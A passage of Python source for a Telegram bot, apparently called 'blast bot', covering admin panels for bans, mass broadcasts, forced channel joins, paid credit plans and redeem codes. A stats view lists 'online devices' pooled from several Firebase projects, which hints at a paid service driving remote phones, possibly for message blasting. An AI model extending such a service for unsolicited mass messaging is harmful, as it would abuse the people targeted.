        return
    if is_owner(ban_id, d) or is_admin(ban_id, d):
        await state.clear()
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Admin/Owner ko ban nahi kar sakte!", parse_mode="HTML")
        return
    if ban_id not in d.get("banned", []):
        d.setdefault("banned", []).append(ban_id)
        save(d)
    await state.clear()
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await msg.answer(
        f"{em(EMOJI_CROSS, '🚫')} <b>Ban ho gaya!</b>\n<code>{ban_id}</code>",
        reply_markup=back_kb,
        parse_mode="HTML"
    )
    try:
        await msg.bot.send_message(ban_id, f"{em(EMOJI_CROSS, '🚫')} Aapko ban kar diya gaya. Admin se contact karein.", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.in_({"owner:unban:menu", "admin:unban:menu"}))
async def panel_unban_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    banned = d.get("banned", [])
    if not banned:
        await cq.answer("✅ Koi banned nahi!", show_alert=True)
        return
    prefix = "owner" if is_owner(cq.from_user.id, d) else "admin"
    await safe_edit(cq.message, 
        f"{em(EMOJI_CHECK, '🔓')} <b>Unban User</b>\n\nBanned: <b>{len(banned)}</b>",
        reply_markup=unban_menu_kb(d, prefix),
        parse_mode="HTML"
    )

@R.callback_query(F.data.regexp(r"^(owner|admin):unban:do:(\d+)$"))
async def panel_unban_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    ban_id = int(cq.data.split(":")[-1])
    if ban_id in d.get("banned", []):
        d["banned"].remove(ban_id)
        save(d)
    await cq.answer(f"✅ {ban_id} unban ho gaya!", show_alert=True)
    back_text = owner_panel_text(d) if is_owner(uid, d) else admin_panel_text(d)
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await safe_edit(cq.message, back_text, reply_markup=back_kb, parse_mode="HTML")
    try:
        await cq.bot.send_message(ban_id, f"{em(EMOJI_CHECK, '✅')} Aapka ban hata diya gaya. /start karein.", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.in_({"owner:broadcast", "admin:broadcast"}))
async def panel_broadcast_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.broadcast)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await safe_edit(cq.message, 
        f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\nJo message bhejni hai woh type karo:",
        reply_markup=kb([(f"{sc('cancel')}", back)]),
        parse_mode="HTML"
    )

@R.message(S.broadcast)
async def panel_broadcast_do(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    await state.clear()
    users = d.get("users", {})
    wait = await msg.answer(f"{em(EMOJI_BELL, '📤')} Broadcasting to <b>{len(users)}</b> users...", parse_mode="HTML")
    ok = 0
    fail = 0
    for uid_str in users:
        try:
            target = int(uid_str)
            if msg.text:
                bcast_text = f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\n{msg.text}"
                await msg.bot.send_message(target, bcast_text, parse_mode="HTML")
            else:
                await msg.copy_to(target)
            ok += 1
        except Exception:
            fail += 1
        await asyncio.sleep(0.05)
    await wait.delete()
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Broadcast Done!</b>\n\n{em(EMOJI_CHECK, '✅')} Delivered: <b>{ok}</b>\n{em(EMOJI_CROSS, '❌')} Failed: <b>{fail}</b>",
        reply_markup=back_kb,
        parse_mode="HTML"
    )

@R.message(Command("broadcastbtn"))
async def cmd_broadcast_btn(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Admin only!", parse_mode="HTML")
        return

    if not msg.reply_to_message:
        await msg.answer(
            f"{em(EMOJI_STAR, '⭐')} Reply to the message you want to broadcast.\n\n"
            f"Use:\n"
            f"<code>/broadcastbtn Button Text | https://example.com | success | EMOJI_ID</code>\n\n"
            f"Styles: primary (blue), success (green), danger (red)\n"
            f"Style and premium emoji ID are optional.",
            parse_mode="HTML"
        )
        return

    parts = msg.text.split(maxsplit=1)
    if len(parts) < 2:
        await msg.answer(
            f"{em(EMOJI_CROSS, '❌')} Provide button details:\n\n"
            f"<code>/broadcastbtn Button Text | https://example.com | success | EMOJI_ID</code>",
            parse_mode="HTML"
        )
        return

    args = [p.strip() for p in parts[1].split("|")]
    if len(args) < 2:
        await msg.answer(
            f"{em(EMOJI_CROSS, '❌')} Invalid format. Use:\n\n"
            f"<code>/broadcastbtn Button Text | https://example.com | success | EMOJI_ID</code>",
            parse_mode="HTML"
        )
        return

    btn_text = args[0].strip()
    btn_link = args[1].strip()

    if not btn_text or not btn_link:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Button text and URL cannot be empty!", parse_mode="HTML")
        return
    if not (btn_link.startswith("http://") or btn_link.startswith("https://") or btn_link.startswith("tg://")):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} URL must start with http://, https:// or tg://", parse_mode="HTML")
        return

    style = args[2].strip().lower() if len(args) > 2 and args[2].strip() else "primary"
    if style not in ("primary", "success", "danger"):
        style = "primary"
    emoji_id = args[3].strip() if len(args) > 3 and args[3].strip() else None

    button = btn_url(btn_text, btn_link, emoji_id, style=style)
    markup = InlineKeyboardMarkup(inline_keyboard=[[button]])

    reply_msg = msg.reply_to_message
    users = d.get("users", {})
    wait = await msg.answer(f"{em(EMOJI_BELL, '📤')} Broadcasting (with button) to <b>{len(users)}</b> users...", parse_mode="HTML")

    ok, fail = 0, 0
    for uid_str in users:
        try:
            target = int(uid_str)
            await msg.bot.copy_message(
                chat_id=target,
                from_chat_id=reply_msg.chat.id,
                message_id=reply_msg.message_id,
                reply_markup=markup
            )
            ok += 1
        except Exception as e:
            fail += 1
        await asyncio.sleep(0.05)

    await wait.delete()
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Broadcast (with button) Done!</b>\n\n"
        f"{em(EMOJI_CHECK, '✅')} Delivered: <b>{ok}</b>\n{em(EMOJI_CROSS, '❌')} Failed: <b>{fail}</b>",
        reply_markup=back_kb,
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:export_script")
async def owner_export_script(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await cq.answer("📤 Exporting...")
    try:
        script_path = os.path.abspath(__file__)
        if not os.path.exists(script_path):
            script_path = _DATA_FILE.replace(".json", ".py")
            if not os.path.exists(script_path):
                script_path = "blast_bot_v3.2_premium.py"
        await cq.message.reply_document(
            document=FSInputFile(script_path),
            caption=f"{em(EMOJI_GEAR, '📤')} <b>Script Export</b> — <i>{_VERSION}</i>",
            parse_mode="HTML"
        )
    except Exception as e:
        await cq.answer(f"❌ Export failed: {str(e)[:40]}", show_alert=True)

@R.callback_query(F.data.in_({"admin:home", "admin:refresh"}))
async def admin_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin Only!", show_alert=True)
        return
    try:
        await safe_edit(cq.message, admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    except TelegramBadRequest: pass

@R.callback_query(F.data == "admin:stats")
async def admin_stats_cb(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin Only!", show_alert=True)
        return
    await cq.answer("⏳ Fetching...")

    current_fb_ids = {fb["id"] for fb in d.get("firebases", [])}
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]
    stale = [k for k in FB_DEVICE_COUNTS if k not in current_fb_ids]
    for k in stale:
        FB_DEVICE_COUNTS.pop(k, None)

    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)

    stats_text = api_stats_text(d)
    dev_lines = [f"\n{em(EMOJI_CHECK, '🟢')} <b>Online Devices ({len(devices)})</b>\n"]
    if not devices:
        dev_lines.append(f"  {em(EMOJI_WARNING, '😴')} Koi device online nahi")
    for dv in devices:
        dev_lines.append(f"  {em(EMOJI_PHONE, '📱')} <b>{dv['dev_name'][:20]}</b> — {em(EMOJI_FIRE, '🔥')} {dv['fb_label'][:20]}")
    full = stats_text + "\n" + "\n".join(dev_lines)

    if len(full) > 4000:
        full = full[:3990] + "\n<i>...truncated</i>"

    await safe_edit(cq.message, 
        full,
        reply_markup=kb([
            (f"{sc('refresh')}", "admin:stats"),
            (f"{sc('back')}", "admin:home")
        ]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:fj:menu")
async def owner_fj_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    fj = d.get("force_join", {})
    channels = fj.get("channels", [])
    status = f"{em(EMOJI_CHECK, '🟢')} ON" if fj.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} OFF"

    text = f"{em(EMOJI_BELL, '🔗')} <b>Force Join Settings</b>\n\nStatus: {status}\nChannels: <b>{len(channels)}</b>\n\n"
    for ch in channels:
        req = f"{em(EMOJI_CHECK, '✅')} Required" if ch.get("required", True) else f"{em(EMOJI_CROSS, '❌')} Optional"
        text += f"• {ch.get('title', 'Channel')} (<code>{ch['id']}</code>)\n  {req} | {ch['link']}\n\n"

    rows = [
        [btn("ᴀᴅᴅ ᴄʜᴀɴɴᴇʟ", "owner:fj:add", EMOJI_CHECK, "➕")],
        [btn("ʀᴇᴍᴏᴠᴇ ᴄʜᴀɴɴᴇʟ", "owner:fj:remove", EMOJI_CROSS, "🗑")],
        [InlineKeyboardButton(
            text=f"🟢 {sc('enable')}" if not fj.get("enabled") else f"🔴 {sc('disable')}",
            callback_data="owner:fj:toggle", style="danger" if fj.get("enabled") else "success"
        )],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await safe_edit(cq.message, text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:fj:add")
async def owner_fj_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.fj_add_channel)
    await safe_edit(cq.message, 
        f"{em(EMOJI_BELL, '🔗')} <b>Add Force Join Channel</b>\n\n"
        f"{sc('step 1/2')}: Channel/Group ka Telegram ID bhejo:\n"
        f"<i>Example: -1001234567890</i>\n\n"
        f"<b>Note:</b> Bot ko us channel/group mein admin hona chahiye.",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fj:menu")]),
        parse_mode="HTML"
    )

@R.message(S.fj_add_channel)
async def owner_fj_add_channel(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        ch_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid channel ID bhejo (numbers only, e.g. -100xxx).", parse_mode="HTML")
        return
    await state.update_data(fj_channel_id=ch_id)
    await state.set_state(S.fj_add_link)
    await msg.answer(
        f"{em(EMOJI_BELL, '🔗')} <b>{sc('step 2/2')}</b>\n\n"
        f"Channel/Group ka invite link bhejo:\n"
        f"<i>Example: https://t.me/+AbCdEfGhIjK</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fj:menu")]),
        parse_mode="HTML"
    )

@R.message(S.fj_add_link)
async def owner_fj_add_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid link bhejo (https:// se start hona chahiye).", parse_mode="HTML")
        return

    fsmd = await state.get_data()
    ch_id = str(fsmd.get("fj_channel_id"))

    try:
        chat = await msg.bot.get_chat(int(ch_id))
        title = chat.title or "Channel"
    except:
        title = "Channel"

    channels = d.setdefault("force_join", {}).setdefault("channels", [])
    channels = [c for c in channels if str(c["id"]) != ch_id]
    channels.append({"id": ch_id, "link": link, "title": title, "required": True})
    d["force_join"]["channels"] = channels
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Channel Added!</b>\n\n{em(EMOJI_BELL, '📢')} {title}\n{em(EMOJI_GEAR, '🔗')} {link}",
        reply_markup=kb([(f"{sc('back')}", "owner:fj:menu")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:fj:remove")
async def owner_fj_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    channels = d.get("force_join", {}).get("channels", [])
    if not channels:
        await cq.answer("❌ Koi channel nahi hai!", show_alert=True)
        return

    rows = []
    for ch in channels:
        rows.append([btn(f"{ch.get('title', 'Channel')[:25]}", f"owner:fj:del:{ch['id']}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:fj:menu", EMOJI_GEAR, "🔙")])

    await safe_edit(cq.message, 
        f"{em(EMOJI_CROSS, '🗑')} <b>Remove Channel</b>\n\nKaunsa channel hataana hai?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:fj:del:"))
async def owner_fj_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    ch_id = cq.data.split("owner:fj:del:", 1)[1]
    channels = d.get("force_join", {}).get("channels", [])
    d["force_join"]["channels"] = [c for c in channels if str(c["id"]) != ch_id]
    save(d)
    await cq.answer("🗑 Channel removed!")
    await owner_fj_menu(cq, state)

@R.callback_query(F.data == "owner:fj:toggle")
async def owner_fj_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    fj = d.setdefault("force_join", {})
    fj["enabled"] = not fj.get("enabled", False)
    save(d)
    status = "ENABLED" if fj["enabled"] else "DISABLED"
    await cq.answer(f"Force Join {status}!", show_alert=True)
    await owner_fj_menu(cq, state)

@R.callback_query(F.data == "owner:pricing:menu")
async def owner_pricing_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    plans = d.get("pricing", {}).get("plans", [])

    text = f"{em(EMOJI_MONEY, '💳')} <b>Pricing Plans</b>\n\nTotal Plans: <b>{len(plans)}</b>\n\n"
    for i, plan in enumerate(plans, 1):
        text += f"{i}. <b>{plan['name']}</b>\n   {em(EMOJI_MONEY, '💰')} {plan['price']} {plan.get('currency', 'INR')} = {plan['credits']} credits\n   {em(EMOJI_GEAR, '🔗')} {plan['payment_link']}\n\n"

    rows = [
        [btn("ᴀᴅᴅ ᴘʟᴀɴ", "owner:pricing:add", EMOJI_CHECK, "➕")],
        [btn("ʀᴇᴍᴏᴠᴇ ᴘʟᴀɴ", "owner:pricing:remove", EMOJI_CROSS, "🗑")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await safe_edit(cq.message, text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:pricing:add")
async def owner_pricing_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_plan_name)
    await safe_edit(cq.message, 
        f"{em(EMOJI_MONEY, '💳')} <b>Add Pricing Plan</b>\n\n{sc('step 1/4')}: Plan ka naam bhejo:\n<i>Example: Basic Plan</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_plan_name)
async def owner_pricing_name(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    await state.update_data(plan_name=msg.text.strip())
    await state.set_state(S.add_plan_price)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💳')} <b>{sc('step 2/4')}</b>\n\nPrice bhejo:\n<i>Example: 50</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_plan_price)
async def owner_pricing_price(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        price = float(msg.text.strip())
        await state.update_data(plan_price=price)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid price bhejo (numbers only).", parse_mode="HTML")
        return
    await state.set_state(S.add_plan_credits)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💳')} <b>{sc('step 3/4')}</b>\n\nKitne credits dena hai?\n<i>Example: 100</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_plan_credits)
async def owner_pricing_credits(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        credits = int(msg.text.strip())
        await state.update_data(plan_credits=credits)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo.", parse_mode="HTML")
        return
    await state.set_state(S.add_plan_link)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💳')} <b>{sc('step 4/4')}</b>\n\nPayment redirect link bhejo:\n"
        f"<i>Example: {SUPER_ADMIN_LINK} ya koi payment URL</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_plan_link)
async def owner_pricing_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid URL bhejo (https:// se start hona chahiye).", parse_mode="HTML")
        return

    fsmd = await state.get_data()
    plan = {
        "id": str(int(time.time())),
        "name": fsmd.get("plan_name", "Plan"),
        "price": fsmd.get("plan_price", 0),
        "credits": fsmd.get("plan_credits", 0),
        "currency": "INR",
        "payment_link": link
    }
    d.setdefault("pricing", {}).setdefault("plans", []).append(plan)
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Plan Added!</b>\n\n{em(EMOJI_STAR, '📋')} {plan['name']}\n{em(EMOJI_MONEY, '💰')} {plan['price']} INR = {plan['credits']} credits\n{em(EMOJI_GEAR, '🔗')} {plan['payment_link']}",
        reply_markup=kb([(f"{sc('back')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:pricing:remove")
async def owner_pricing_remove(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        await cq.answer("❌ Koi plan nahi hai!", show_alert=True)
        return

    rows = []
    for plan in plans:
        rows.append([btn(f"{plan['name'][:25]}", f"owner:pricing:del:{plan['id']}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:pricing:menu", EMOJI_GEAR, "🔙")])

    await safe_edit(cq.message, 
        f"{em(EMOJI_CROSS, '🗑')} <b>Remove Plan</b>\n\nKaunsa plan hataana hai?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:pricing:del:"))
async def owner_pricing_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    plan_id = cq.data.split("owner:pricing:del:", 1)[1]
    plans = d.get("pricing", {}).get("plans", [])
    d["pricing"]["plans"] = [p for p in plans if p["id"] != plan_id]
    save(d)
    await cq.answer("🗑 Plan removed!")
    await owner_pricing_menu(cq, state)

@R.callback_query(F.data == "owner:redeem:menu")
async def owner_redeem_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    codes = d.get("redeem_codes", {})

    text = f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Codes</b>\n\nTotal: <b>{len(codes)}</b>\n\n"
    for code, data in list(codes.items())[:10]:
        status = f"{em(EMOJI_CHECK, '✅')} Active" if data.get("uses_left", 0) > 0 else f"{em(EMOJI_CROSS, '❌')} Expired"
        text += f"<code>{code}</code> — {em(EMOJI_MONEY, '💰')}{data['credits']} — {status} ({data.get('uses_left', 0)} left)\n"

    rows = [
        [btn("ɢᴇɴᴇʀᴀᴛᴇ ᴄᴏᴅᴇ", "owner:redeem:gen", EMOJI_CHECK, "➕")],
        [btn("ᴅᴇʟᴇᴛᴇ ᴄᴏᴅᴇ", "owner:redeem:del", EMOJI_CROSS, "🗑")],
        [btn("ʀᴇᴍᴏᴠᴇ ᴄʀᴇᴅɪᴛs (ʀᴇᴅᴇᴇᴍ)", "owner:redeem:remove_credits:menu", EMOJI_MONEY, "💸", style="danger")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await safe_edit(cq.message, text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:redeem:gen")
async def owner_redeem_gen_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.gen_redeem_credits)
    await safe_edit(cq.message, 
        f"{em(EMOJI_GIFT, '🎁')} <b>Generate Redeem Code</b>\n\n{sc('step 1/2')}: Kitne credits dena hai?\n<i>Example: 50</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:redeem:menu")]),
        parse_mode="HTML"
    )

@R.message(S.gen_redeem_credits)
async def owner_redeem_credits(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        credits = int(msg.text.strip())
        await state.update_data(gen_credits=credits)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo.", parse_mode="HTML")
        return
    await state.set_state(S.gen_redeem_uses)
    await msg.answer(
        f"{em(EMOJI_GIFT, '🎁')} <b>{sc('step 2/2')}</b>\n\nKitni baar use ho sakta hai?\n<i>Example: 10</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:redeem:menu")]),
        parse_mode="HTML"
    )

@R.message(S.gen_redeem_uses)
async def owner_redeem_uses(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        uses = int(msg.text.strip())
        if uses < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo (1 ya zyada).", parse_mode="HTML")
        return

    fsmd = await state.get_data()
    credits = fsmd.get("gen_credits", 10)

    def _gen(d):
        while True:
            code = "GIFT" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
            if code not in d.get("redeem_codes", {}):
                break
        d.setdefault("redeem_codes", {})[code] = {
            "credits": credits,
            "uses_left": uses,
            "created_by": msg.from_user.id,
            "created_at": int(time.time()),
            "used_by": []
        }
        return code

    code = atomic_update(_gen)
    await state.clear()

    me = await msg.bot.get_me()
    redeem_link = f"https://t.me/{me.username}?start=RDM{code}"

    await msg.answer(
        f"{em(EMOJI_GIFT, '🎉')} <b>Redeem Code Generated!</b>\n\n"
        f"{em(EMOJI_GIFT, '🎁')} Code: <code>{code}</code>\n"
        f"{em(EMOJI_MONEY, '💰')} Credits: <b>{credits}</b>\n"
        f"{em(EMOJI_STAR, '🔢')} Max Uses: <b>{uses}</b>\n\n"
        f"{em(EMOJI_GEAR, '🔗')} <b>Auto-Redeem Link:</b>\n<code>{redeem_link}</code>\n\n"
        f"<i>Is link pe click karte hi credits automatically add ho jayenge!\n"
        f"Ya phir users manually bhi ye code redeem kar sakte hain.</i>",
        reply_markup=kb([(f"{sc('back')}", "owner:redeem:menu")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:redeem:del")
async def owner_redeem_del_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    codes = d.get("redeem_codes", {})
    if not codes:
        await cq.answer("❌ Koi code nahi hai!", show_alert=True)
        return

    rows = []
    for code in list(codes.keys())[:20]:
        rows.append([btn(code, f"owner:redeem:deldo:{code}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:redeem:menu", EMOJI_GEAR, "🔙")])

    await safe_edit(cq.message, 
        f"{em(EMOJI_CROSS, '🗑')} <b>Delete Redeem Code</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:redeem:deldo:"))
async def owner_redeem_del_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    code = cq.data.split("owner:redeem:deldo:", 1)[1]
    if code in d.get("redeem_codes", {}):
        del d["redeem_codes"][code]
        save(d)
    await cq.answer("🗑 Code deleted!")
    await owner_redeem_menu(cq, state)

@R.callback_query(F.data == "owner:redeem:remove_credits:menu")
async def owner_redeem_remove_credits_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    codes = d.get("redeem_codes", {})
    if not codes:
        await cq.answer("❌ Koi code nahi hai!", show_alert=True)
        return

    rows = []
    for code, cdata in list(codes.items())[:20]:
        used_count = len(cdata.get("used_by", []))
        label = f"{code} ({used_count} users)"
        rows.append([btn(label, f"owner:redeem:rmcredits:confirm:{code}", EMOJI_MONEY, "💸", style="danger")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:redeem:menu", EMOJI_GEAR, "🔙")])

    await safe_edit(cq.message, 
        f"{em(EMOJI_MONEY, '💸')} <b>Remove Credits Added By Redeem Code</b>\n\n"
        f"<i>Ye us code se jitne bhi users ne credits liye hain, unse woh credits wapas le lega.</i>\n\n"
        f"Kaunsa code select karein?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:redeem:rmcredits:confirm:"))
async def owner_redeem_remove_credits_confirm(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    code = cq.data.split("owner:redeem:rmcredits:confirm:", 1)[1]
    codes = d.get("redeem_codes", {})
    if code not in codes:
        await cq.answer("❌ Code nahi mila!", show_alert=True)
        return

    cdata = codes[code]
    used_by = cdata.get("used_by", [])
    credits_per_user = cdata.get("credits", 0)

    await safe_edit(cq.message, 
        f"{em(EMOJI_WARNING, '⚠️')} <b>Confirm Remove Credits</b>\n\n"
        f"{em(EMOJI_GIFT, '🎁')} Code: <code>{code}</code>\n"
        f"{em(EMOJI_MONEY, '💰')} Credits per user: <b>{credits_per_user}</b>\n"
        f"{em(EMOJI_STAR, '👥')} Affected users: <b>{len(used_by)}</b>\n\n"
        f"<b>Ye action un sabhi users se {credits_per_user} credits wapas le lega "
        f"jinhone ye code redeem kiya tha. Ye undo nahi ho sakta!</b>\n\n"
        f"Confirm karein?",
        reply_markup=kb(
            [("✅ Haan, Remove Karo", f"owner:redeem:rmcredits:do:{code}")],
            [("❌ Cancel", "owner:redeem:menu")]
        ),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:redeem:rmcredits:do:"))
async def owner_redeem_remove_credits_do(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    code = cq.data.split("owner:redeem:rmcredits:do:", 1)[1]
    await cq.answer("⏳ Processing...")

    def _remove(d):
        codes = d.get("redeem_codes", {})
        if code not in codes:
            return None
        cdata = codes[code]
        used_by = list(cdata.get("used_by", []))
        credits_per_user = cdata.get("credits", 0)
        affected = []
        for uid in used_by:
            k = str(uid)
            if k in d.get("users", {}):
                current = d["users"][k].get("credits", 0)
                new_val = max(0, current - credits_per_user)
                deducted = current - new_val
                d["users"][k]["credits"] = new_val
                if deducted > 0:
                    affected.append((uid, deducted, new_val))
        # clear the used_by list + reset uses_left so code can be reused cleanly if desired
        cdata["used_by"] = []
        return {"affected": affected, "credits_per_user": credits_per_user}

    result = atomic_update(_remove)

    if result is None:
        await safe_edit(cq.message, 
            f"{em(EMOJI_CROSS, '❌')} Code nahi mila ya already processed!",
            reply_markup=kb([(f"{sc('back')}", "owner:redeem:menu")]),
            parse_mode="HTML"
        )
        return

    affected = result["affected"]

    notified = 0
    for uid, deducted, new_val in affected:
        try:
            await cq.bot.send_message(
